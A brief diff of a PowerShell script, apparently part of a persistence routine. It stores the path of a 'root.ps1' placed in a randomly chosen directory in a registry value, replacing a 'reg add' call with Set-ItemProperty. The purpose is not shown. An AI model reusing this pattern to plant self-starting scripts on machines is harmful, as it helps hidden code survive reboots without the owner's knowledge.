@@ -21,8 +21,7 @@ if(($rootScriptPath -eq $null) -or ($rootScriptPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $rootScriptPath = $paths[$idx]
     $rootScriptPath = "$rootScriptPath\root.ps1"
-    reg add "$basePath" /v $propertyName /t REG_SZ /d $rootScriptPath /f
-    #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootScriptPath -Force | Out-Null
+    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootScriptPath -Force | Out-Null
 }
 
 $exePath = "powershell.exe"
